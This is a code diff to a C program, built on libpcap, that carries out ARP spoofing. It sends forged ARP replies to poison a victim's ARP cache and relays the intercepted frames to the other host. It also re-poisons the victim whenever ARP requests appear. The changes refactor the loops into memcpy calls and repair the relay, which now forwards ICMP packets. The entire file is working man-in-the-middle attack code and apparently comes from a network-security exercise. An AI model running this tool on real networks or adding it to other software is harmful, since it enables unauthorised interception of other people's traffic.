@@ -12,6 +12,7 @@
 #include <netinet/tcp.h>
 #include <netinet/in.h>
 #include <pthread.h>
+#include <time.h>
 
 #define ARP_REQUEST 1
 #define ARP_REPLY 2
@@ -55,7 +56,6 @@ int main(int argc, char *argv[])
 	HOST sdr;
 	HOST tar;
 	u_char dev[10];
-	int i;
 	pthread_t thread[2];
 	PARAM param[2];
 	uint32_t status[2];
@@ -82,15 +82,13 @@ int main(int argc, char *argv[])
 	
 	/* for sdr */
 	capsulize_param(&param[0], dev, &my, &sdr, &tar);
-	//relay_packet(&param[0]);
 	pthread_create(&thread[0], NULL, relay_packet, (void*)&param[0]);
-	printf("Create thread 1\n");
+
 
 	/* for tar */
 	capsulize_param(&param[1], dev, &my, &tar, &sdr);
-	//relay_packet(&param[1]);
 	pthread_create(&thread[1], NULL, relay_packet, (void*)&param[1]);
-	printf("Create thread 2\n");
+
 
 	pthread_join(thread[0], (void**)&status[0]);
 	pthread_join(thread[1], (void**)&status[1]);
@@ -127,9 +125,8 @@ int Get_my_info(u_char *dev, HOST *my)
 	
 	/* Get my mac addr */
 	ioctl(fd, SIOCGIFHWADDR, &ifr);
-	for (i=0 ; i<6 ; i++)
-		my->mac[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
-
+	memcpy(my->mac, ifr.ifr_hwaddr.sa_data, 6);
+	
 	close(fd);
 	return 1;
 }
@@ -174,10 +171,8 @@ int Get_hwaddr_by_ip(u_char *dev, HOST *my, HOST *tar)
 
 
 	/* set ethernet header */
-	for (i=0 ; i<6 ; i++)
-		ether.h_source[i] = my->mac[i];
-	for (i=0 ; i<6 ; i++)
-		ether.h_dest[i] = 0xff;
+	memcpy(ether.h_source, my->mac, 6);
+	memcpy(ether.h_dest, "\xff\xff\xff\xff\xff\xff", 6);
 	ether.h_proto = htons(ETHERTYPE_ARP);
 	memcpy(send, (char*)&ether, 14);
 
@@ -185,14 +180,11 @@ int Get_hwaddr_by_ip(u_char *dev, HOST *my, HOST *tar)
 	Init_arp(&arp, ARP_REQUEST);
 	inet_pton(AF_INET, my->ip, &arp.sdr_ip);
 	inet_pton(AF_INET, tar->ip, &arp.tar_ip);
-	for (i=0 ; i<6 ; i++)
-		arp.sdr_mac[i] = my->mac[i];
-	for (i=0 ; i<6 ; i++)
-		arp.tar_mac[i] = 0x00;
+	memcpy(arp.sdr_mac, my->mac, 6);
+	memcpy(arp.tar_mac, "\x00\x00\x00\x00\x00\x00", 6);
 	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));
 
 
-	//while(1) {
 	for (cnt=0 ; cnt<10 ; cnt++) {
 		/* Send arp request to sender */
 		if (pcap_sendpacket(handle, send, 42))
@@ -218,8 +210,7 @@ int Get_hwaddr_by_ip(u_char *dev, HOST *my, HOST *tar)
 			if (ntohs(recv_arp->opcode) == ARP_REPLY && *(uint32_t*)arp.tar_ip == *(uint32_t*)recv_arp->sdr_ip)
 			{
 				printf("Get ARP Reply from %s\n", inet_ntoa(*(struct in_addr*)recv_arp->sdr_ip));
-				for (i=0 ; i<6 ; i++)
-					tar->mac[i] = recv_arp->sdr_mac[i];
+				memcpy(tar->mac, recv_arp->sdr_mac, 6);
 				break;
 			}
 		}
@@ -245,21 +236,17 @@ void Send_poisoned_arp(pcap_t *handle, u_char *dev, HOST *my, HOST *sdr, HOST *t
 	struct ethhdr ether;
 	struct arphdr arp;
 
-	printf("start send\n");
 
 	/* Open the session in promiscuous mode */
-	//handle = pcap_open_live(dev, 65536, 0, 1000, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
 		return;
 	}
-	printf("open handle in send\n");
+
 
 	/* set ethernet header */
-	for (i=0 ; i<6 ; i++)
-		ether.h_source[i] = my->mac[i];
-	for (i=0 ; i<6 ; i++)
-		ether.h_dest[i] = sdr->mac[i];
+	memcpy(ether.h_source, my->mac, 6);
+	memcpy(ether.h_dest, sdr->mac, 6);
 	ether.h_proto = htons(ETHERTYPE_ARP);
 	memcpy(send, (char*)&ether, 14);
 
@@ -267,10 +254,8 @@ void Send_poisoned_arp(pcap_t *handle, u_char *dev, HOST *my, HOST *sdr, HOST *t
 	Init_arp(&arp, ARP_REPLY);
 	inet_pton(AF_INET, tar->ip, &arp.sdr_ip);
 	inet_pton(AF_INET, sdr->ip, &arp.tar_ip);
-	for (i=0 ; i<6 ; i++)
-		arp.sdr_mac[i] = my->mac[i];
-	for (i=0 ; i<6 ; i++)
-		arp.tar_mac[i] = sdr->mac[i];
+	memcpy(arp.sdr_mac, my->mac, 6);
+	memcpy(arp.tar_mac, sdr->mac, 6);
 	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));
 
 	printf("tar : %s\n", tar->ip);
@@ -283,10 +268,7 @@ void Send_poisoned_arp(pcap_t *handle, u_char *dev, HOST *my, HOST *sdr, HOST *t
 		fprintf(stderr, "Couldn't send packet\n");
 		return;
 	}
-	printf("Send ARP Attack to %s!!\n", sdr->ip);
-	//pcap_close(handle);
-	printf("close handle in send\n");
-	return;
+	printf("Send ARP Attack to %s!!\n\n", sdr->ip);
 }
 
 
@@ -308,22 +290,24 @@ void *relay_packet(void *_param)
 	struct bpf_program fp;		/* The compiled filter */
 	struct pcap_pkthdr *header;	/* The header that pcap gives us */
 	bpf_u_int32 net;		/* Our IP */
-	char filter_exp[] = "ip and arp";	/* The filter expression */
+	char filter_exp[] = "ip or arp";	/* The filter expression */
 	unsigned char *packet;		/* Buffer to recv */
 	struct ethhdr *recv_ether;
 	struct arphdr *recv_arp;
+	struct ip *ip;
 	PARAM *param = (PARAM *)_param;
 	uint32_t res;
 	uint32_t i;
+	uint32_t size;
 
-	printf("start thread\n");
+
 	/* Open the session in promiscuous mode */
-	handle = pcap_open_live(param->dev, 65536, 0, 1000, errbuf);
+	handle = pcap_open_live(param->dev, 65536, 0, 1, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "Couldn't open device %s: %s\n", param->dev, errbuf);
 		pthread_exit((void *)0);
 	}
-	printf("open handle in rlay\n");
+
 
 	/* Compile and apply the filter */
 	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
@@ -334,11 +318,11 @@ void *relay_packet(void *_param)
 		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
 		pthread_exit((void *)0);
 	}
-	printf("compile handle in relay\n");
+
 	Send_poisoned_arp(handle, param->dev, param->my, param->sdr, param->tar);
-	printf("send poison in relay\n");
+
+
 	while(1) {
-		//printf("hi");
 		res = pcap_next_ex(handle, &header, (const u_char**)&packet);
 		if (res==0)
 			continue;
@@ -347,40 +331,46 @@ void *relay_packet(void *_param)
 			fprintf(stderr, "Couldn't recv packet\n");
 			pthread_exit((void *)0);
 		}
-		printf("Get packet!\n");
-		recv_ether = (struct ethhdr*)packet;
-		/* Relay IP packet */
-		if (recv_ether->h_proto = ETHERTYPE_IP)
-		{
-			/* change ethernet header info */
-			for (i=0 ; i<6 ; i++)
-				recv_ether->h_source[i] = param->my->mac[i];
-			for (i=0 ; i<6 ; i++)
-				recv_ether->h_dest[i] = param->tar->mac[i];
 
-			/* Relay IP packet */
-			if (pcap_sendpacket(handle, packet, 42))
-			{
-				fprintf(stderr, "Couldn't send packet\n");
-				pthread_exit((void *)0);
-			}
-		}
-		/* Recover sdr's arp table */
-		else if (recv_ether->h_proto == ETHERTYPE_ARP)
+		recv_ether = (struct ethhdr*)packet;
+
+		/* Relay IP packet */
+		if (ntohs(recv_ether->h_proto) == ETHERTYPE_IP)
 		{
-			recv_arp = (struct arphdr*)(packet + 14);
-			if (recv_arp->opcode == ARP_REQUEST)
+			ip = (struct ip*)(packet + sizeof(struct ethhdr));
+			if (ip->ip_p == IPPROTO_ICMP)
 			{
-				printf("hi ");
-				if (*(uint32_t*)recv_arp->sdr_ip == *(uint32_t*)param->sdr->ip)
+				if (!memcmp(recv_ether->h_source, param->sdr->mac, 6))
 				{
-					printf("yea ");
-					if (!memcmp(recv_ether->h_dest, "\xff\xff\xff\xff\xff\xff", 6))
-						Send_poisoned_arp(handle, param->dev, param->my, param->sdr, param->tar);
+					printf("Get ICMP packet!\n");		
+					/* change ethernet header info */
+					memcpy(recv_ether->h_source, param->my->mac, 6);
+					memcpy(recv_ether->h_dest, param->tar->mac, 6);
+				
+					size = sizeof(struct ethhdr) + ntohs(ip->ip_len);
+					printf("size : %d\n\n", size); 
+					/* Relay IP packet */
+					if (pcap_sendpacket(handle, packet, size))
+					{
+						fprintf(stderr, "Couldn't send packet\n");
+						pthread_exit((void *)0);
+					}
 				}
 			}
 		}
+		/* Recover sdr's arp table */
+		else if (ntohs(recv_ether->h_proto) == ETHERTYPE_ARP)
+		{
+			printf("Get ARP packet!\n");
+			
+			recv_arp = (struct arphdr*)(packet + 14);
+			if (recv_arp->opcode == ARP_REQUEST)
+				if (*(uint32_t*)recv_arp->sdr_ip == *(uint32_t*)param->sdr->ip)
+					if (!memcmp(recv_ether->h_dest, "\xff\xff\xff\xff\xff\xff", 6) || !memcmp(recv_ether->h_dest, param->my->mac, 6))
+						Send_poisoned_arp(handle, param->dev, param->my, param->sdr, param->tar);
+		}
 	}
+
 	pcap_close(handle);
 	pthread_exit((void *)0);
 }
